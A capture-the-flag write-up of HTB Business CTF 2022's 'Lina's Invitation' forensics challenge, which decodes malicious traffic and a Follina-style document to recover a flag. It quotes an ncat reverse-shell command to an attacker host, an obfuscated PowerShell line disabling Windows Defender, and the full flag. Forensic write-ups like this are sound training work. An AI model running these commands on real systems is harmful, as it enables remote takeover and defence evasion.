---
layout: post
title:  "HTB Business CTF 2022 - Lina's Invitation writeup"
date:   2022-07-17 22:00:00 +0300
categories: HTB_Business_CTF_2022 CTF forensics
summary: Writeup for the 'Lina's Invitation' challenge from HTB's Business CTF from 2022. 
---

[Lina's Invitation](https://ctftime.org/task/22937) was a forensics challenge in HTB's Business CTF (2022).  
For this challenge, we received a zip file containing a .docx and a pcap file.  

![ZIP contents]({{site.baseurl}}/assets/img/HTB_Business_CTF_2022/lina_invitation/zip_contents.png){: .center-image}

Let's start with the pcap file.  
After opening it with Wireshark, we can see some http traffic going from the analyzed computer to a remote server.  

![Opening the pcap in wireshark]({{site.baseurl}}/assets/img/HTB_Business_CTF_2022/lina_invitation/wireshark1.png){: .center-image}

We start inspecting that traffic and we see that the server response contains a large URL-ecnoded string.  
This probably contains some useful hints so we continue analyzing it.

![HTTP response]({{site.baseurl}}/assets/img/HTB_Business_CTF_2022/lina_invitation/wireshark_p1.png){: .center-image}

We decode the file using CyberChef's URL decode and we see a HTTP file containing multiple base64-encoded strings.

![HTTP response decoded]({{site.baseurl}}/assets/img/HTB_Business_CTF_2022/lina_invitation/content_1.png){: .center-image}

The large base64-encoded strings are part of the [Invoke-MetasploitPayload](https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-MetasploitPayload.ps1
) script from Empire.  

The last part was a powershell line that contained an obfuscated command by encoding it with base64.
If we decode that part, we get this (newline added by me for readability).

{% highlight powershell %}
c:\\windows\\system32\\cmd.exe /c ncat www.windowsliveupdater.com 5476 \
                                    -e cmd.exe; $pt1=\"HTB{Zer0_DayZ_4Re_C0Ol_BuT_\"
{% endhighlight %}

We have the first part of the flag, **HTB{Zer0\_DayZ\_4Re\_C0Ol\_BuT\_**, with the "$pt1=" part hinting that we should see more parts.  
We also see two more interesting things here:
- the windowsliveupdater.com URL
- port 5476

First, let's use the URL. We can use unzip to extract the content of the docx file and then use grep to see if there's any mention of that string in there.  
We find 3 instances of it and one of them has a "pt2" parameter.  

![The second part of the flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2022/lina_invitation/flag_part2.png){: .center-image}

{% highlight powershell %}
http://windowsliveupdater.com?Pt2=RjBsbGluYV9oNHNf
{% endhighlight %}

If we decode the value of the Pt2 parameter, we get F0llina_h4s_.  
By putting the two pieces together, we have **HTB{Zer0\_DayZ\_4Re\_C0Ol\_BuT\_F0llina\_h4s\_**  
We need more parts to complete the flag

Now we go back to the other thing that we got from that powershell command: port 5476.  
In Wireshark, we can apply a display filter that will show packets that go to that port (we use the filter "tcp.port == 5476")
![Filtering for port 5476]({{site.baseurl}}/assets/img/HTB_Business_CTF_2022/lina_invitation/port5476.png){: .center-image}
If we look at the traffic on that port, we can see the attacker interacting with the compromised system by using a reverse shell.
![Attacker's shell]({{site.baseurl}}/assets/img/HTB_Business_CTF_2022/lina_invitation/wireshark_shell.png){: .center-image}

Two commands stand out from there: the powershell ones that have base64-encoded arguments.  
The first one decodes to 
{% highlight powershell %}
. ( $enV:comSpec[4,24,25]-JOin'') ( ((("{2}{0}{7}{1}{11}{5}{6}{9}{10}{4}{8}{3}"-f \ 'ef',' ','Set-MpPr','ue','t','altime','Moni','erence','r','tor','ing $','-DisableRe')) -repLacE  'K35',[ChAR]36))
{% endhighlight %}

Which after formatting becomes "Set-MpPreference -DisableRealtimeMonitoring $true", which is used to disable Windows Defender.

The argument used for the second command decodes to:
{% highlight powershell %}
Iex ( ((("{2}{7}{6}{5}{9}{0}{8}{3}{10}{4}{1}" -f 'h','.exe','<#{0','!}','eas','A','t3=b33n_p','}p','3d','tc','#> .{1}winp'))-f  [Char]36,[Char]92))
{% endhighlight %}

Which can becomes "<#{0}pt3=b33n_pAtch3d!}.{1}winpeas.exe" after formatting.  
And here we have the last part of the flag  

Now if we put all the parts together, we get the full flag: **HTB{Zer0\_DayZ\_4Re\_C0Ol\_BuT\_F0llina\_h4s\_b33n\_pAtch3d!}**  